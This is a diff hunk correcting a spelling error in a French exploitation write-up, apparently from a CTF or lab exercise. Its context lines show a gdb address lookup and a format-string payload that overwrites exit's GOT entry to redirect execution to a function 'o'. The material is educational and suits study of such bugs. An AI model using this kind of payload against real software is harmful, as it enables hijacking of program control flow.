@@ -83,7 +83,7 @@ Pour avoir la fonction o on peut faire dans gdb print o qui nous donne:
 
     $1 = {<text variable, no debug info>} 0x80484a4 <o>
 
-Maintenant qu'on a l'adresse de exit, la postition de exit dans la stack et l'adresse de o on peut faire notre payload:
+Maintenant qu'on a l'adresse de exit, la position de exit dans la stack et l'adresse de o on peut faire notre payload:
 
     python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'
 
